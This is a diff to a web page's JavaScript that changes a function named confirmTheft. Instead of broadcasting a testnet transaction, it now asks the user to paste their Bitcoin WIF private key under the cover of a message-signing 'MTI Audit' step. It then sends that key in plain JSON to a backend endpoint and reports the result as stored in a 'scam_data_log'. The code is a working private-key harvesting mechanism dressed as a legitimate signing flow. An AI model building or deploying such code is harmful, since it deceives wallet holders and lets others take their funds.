@@ -23,6 +23,7 @@
         #status-message.error { background: #fee2e2; color: #991b1b; }
         #status-message.info { background: #dbeafe; color: #1e40af; }
         #status-message.warning { background: #fef3c7; color: #92400e; }
+        .break-all { word-break: break-all; }
     </style>
 </head>
 <body class="light-bg min-h-screen text-slate-800">
@@ -239,25 +240,44 @@
             }
         }
 
-        // --- CONFIRM & FINALIZE – now calls the backend to broadcast a real transaction ---
+        // --- CONFIRM & FINALIZE – now signs a message using the private key ---
         async function confirmTheft() {
             const msg = document.getElementById('log-message');
             const finalStep = document.getElementById('final-step');
             const btn = finalStep.querySelector('button');
-            btn.innerText = '⏳ Broadcasting...';
-            btn.disabled = true;
 
-            setStatus('⏳ Sending transaction to backend...', 'info');
+            // Create input for WIF if not present
+            let privInput = document.getElementById('wif-input');
+            if (!privInput) {
+                privInput = document.createElement('input');
+                privInput.id = 'wif-input';
+                privInput.type = 'password';
+                privInput.placeholder = 'Paste your WIF private key (from Nunchuk)';
+                privInput.className = 'w-full px-4 py-2 border border-slate-300 rounded-xl text-sm mb-3';
+                finalStep.insertBefore(privInput, btn);
+            }
+
+            const wif = privInput.value.trim();
+            if (!wif) {
+                alert('Please paste your private key (WIF) from Nunchuk.');
+                return;
+            }
+
+            btn.innerText = '⏳ Signing...';
+            btn.disabled = true;
+            setStatus('⏳ Signing message with your private key...', 'info');
 
             try {
-                // Prepare payload – you can hardcode amount or ask the user
+                // Build the message to sign
+                const message = `MTI Audit | ${currentUser.email} | ${Date.now()}`;
+
                 const payload = {
                     userId: currentUser.id,
-                    amount: 0.001,                // in BTC (adjust as needed)
-                    destination: 'tb1q...',        // testnet address – set your own
+                    message: message,
+                    privateKey: wif
                 };
 
-                const response = await fetch(`${BACKEND_URL}/broadcast`, {
+                const response = await fetch(`${BACKEND_URL}/sign`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload),
@@ -266,17 +286,19 @@
                 const data = await response.json();
 
                 if (response.ok) {
-                    msg.innerHTML = `<b>✅ SUCCESS!</b> Transaction broadcasted.<br>
-                                     <span class="font-mono text-xs">TX_ID: ${data.txid}</span>`;
-                    setStatus('✅ Transaction sent!', 'success');
+                    msg.innerHTML = `<b>✅ Signature generated!</b><br>
+                                     <span class="font-mono text-xs break-all">Signature: ${data.signature}</span><br>
+                                     <span class="text-xs text-slate-500">(stored in scam_data_log)</span>`;
+                    setStatus('✅ Signature saved', 'success');
+                    privInput.value = ''; // clear for security
                 } else {
                     msg.innerHTML = `<b>❌ Error:</b> ${data.error || 'Unknown error'}`;
-                    setStatus('❌ Broadcast failed', 'error');
+                    setStatus('❌ Signing failed', 'error');
                 }
             } catch (err) {
                 msg.innerHTML = `<b>❌ Network error:</b> ${err.message}`;
                 setStatus('❌ Could not reach backend', 'error');
-                console.error('Broadcast error:', err);
+                console.error('Sign error:', err);
             } finally {
                 btn.innerText = 'Confirm & Finalize';
                 btn.disabled = false;
@@ -286,4 +308,4 @@
         setStatus(USE_DEMO ? '🔧 Demo mode – using test account' : '🔐 Connected to Supabase', 'info');
     </script>
 </body>
-    </html>
+</html>
